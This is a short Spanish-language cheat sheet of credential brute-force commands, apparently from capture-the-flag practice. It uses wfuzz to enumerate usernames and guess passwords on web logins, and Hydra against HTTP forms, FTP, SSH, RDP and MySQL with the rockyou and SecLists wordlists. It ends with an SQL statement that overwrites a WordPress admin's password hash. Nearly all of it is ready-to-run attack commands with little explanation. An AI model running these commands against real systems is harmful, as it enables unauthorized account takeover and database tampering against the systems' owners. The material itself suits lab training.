
### BRUTEFORCE CON WFUZZ
```shell
BURPSUITE --> ExtractData --> Inspector => Network => LoginReq => RawData (COPY)

# ESTE MENSAJE POR EJEMPLO EN ESTE CASO APARECE CUANDO ES VALIDO EL USUARIO.
❯ wfuzz -c --ss="Invalid login, please try again" -t 200 -X POST -w /usr/share/SecLists/Usernames/Names/names.txt -d 'anchor=&username=FUZZ&password=password' http://teacher.htb/moodle/login/index.php


#CONTRASEÑA
❯ wfuzz -c -t 200 -X POST -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt -d 'username=kanderson&password=FUZZ' http://cozyhosting.htb/login
```


### BRUTE FORCE CON HYDRA
```shell
❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password" -t 50
```

### FTP
```SHELL
hydra -l john -P /usr/share/SecLists/Passwords/xato-net-10-million-passwords-100000.txt ftp://IP_DEL_SERVIDOR
```
### SSH
```SHELL
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
```

### RDP
```SHELL
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```


### MYSQL
### HYDRA
```shell
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.241.88 MySQL -v
```

### CONECTARSE
```shell
mysql -h 192.168.143.88 -u root -p --ssl=0
```


### CAMBIAR HASH DE UNA CONTRASEÑA
```shell
echo -n "123456" | md5sum; echo ""
UPDATE wp_users SET user_pass="HASH" WHERE ID=1;
```